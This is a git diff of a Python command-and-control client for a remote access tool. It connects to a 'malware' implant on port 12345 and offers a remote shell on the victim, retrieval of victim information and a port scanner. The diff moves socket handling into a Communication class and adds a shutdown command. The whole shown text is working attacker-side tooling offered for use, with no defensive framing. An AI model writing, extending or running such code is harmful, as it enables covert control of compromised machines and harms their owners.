@@ -2,23 +2,27 @@ from scapy.layers.inet import IP, TCP
 from scapy.all import *
 import socket
 import argparse
+from Communication import Communication
 
 
 class Shell:
 
-    def __init__(self):
+    def __init__(self, malware_os, communication):
         self._history = []
         self._command = ""
         self._next_command = True
+        self._communication = communication
+        self._malware_os = malware_os
 
     def send(self):
         self._history.append(self._command)
-        s.send(self._command.encode("utf-8"))
+        self._communication.send(self._command)
+        # s.send(self._command.encode("utf-8"))
 
     def receive(self):
-        content = s.recv(4096).decode("utf-8", errors="ignore")
-        if content[2:] == "cd":
-            malware_os.chdir(self._command[3:].decode("utf-8", errors="ignore"))
+        content = self._communication.recv_message_str()
+        # if content[2:] == "cd":
+        #     self._malware_os.chdir(self._command[3:].decode("utf-8", errors="ignore"))
         print(content)
 
     def history(self):
@@ -133,26 +137,32 @@ def start_portscanner(portscanner_ip):
 
 
 def connection(malware_addr):
-    global s
     serv_addr = (malware_addr, 12345)
+    tb = ""
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.connect(serv_addr)
     except socket.error:
+        tb = traceback.format_exc()
         print("[!] Unable to connect to the following address: {}".format(malware_addr))
+    finally:
+        print(tb)
+
+    if tb != "":
         sys.exit(0)
-    print(s.recv(4096).decode('utf-8', errors="ignore"))
+
+    return s
 
 
-def run_commands(malware_os):
+def run_commands(malware_os, communication):
     getinfo = GetInfo(malware_os)
-    shell = Shell()
+    shell = Shell(malware_os, communication)
     print("----------------")
     message = input(
         "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start a "
-        "Port Scanner.\n4. Type exit to quit\n\nAnswer: ")
+        "Port Scanner.\n4. Type shutdown to quit\n\nAnswer: ")
     print("\n----------------------------------------")
-    while message != "exit":
+    while message != "shutdown":
         if message == "1":
             shell.set_next_command(True)
             while shell.get_next_command():
@@ -161,7 +171,7 @@ def run_commands(malware_os):
                     shell.set_command(input("Shell: "))
                 if shell.get_command() == "exit":
                     shell.close()
-                if shell.get_command() == "history":
+                elif shell.get_command() == "history":
                     shell.history()
                 else:
                     shell.send()
@@ -182,28 +192,30 @@ def run_commands(malware_os):
             shell.send()
             shell.receive()
             shell.set_command("")
-
-
         elif message == "3":
             scan = PortScanner()
             scan.scanner()
-
+        elif message == "shutdown":
+            communication.send(message)
+            closing_signal = communication.recv_message_str()
+            if closing_signal == "ok":
+                sys.exit(0)
         print("\n----------------------------------------")
         message = input(
             "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start a "
-            "Port Scanner.\n4. Type exit to quit\n\nAnswer: ")
+            "Port Scanner.\n4. Type shutdown to quit\n\nAnswer: ")
 
 
 def main():
-    global s, malware_os
     parser_options = set_up_parser()
     malware_addr = get_malware_address(parser_options[0])
     start_portscanner(parser_options[1])
-    connection(malware_addr)
-    s.send("os".encode("utf-8"))
-    malware_os = s.recv(4096).decode('utf-8', errors="ignore")
-    run_commands(malware_os)
-    s.close()
+    sock = connection(malware_addr)
+    communication = Communication(sock)
+    communication.send("os")
+    malware_os = communication.recv_message_str()
+    run_commands(malware_os, communication)
+    sock.close()
 
 
 if __name__ == "__main__":
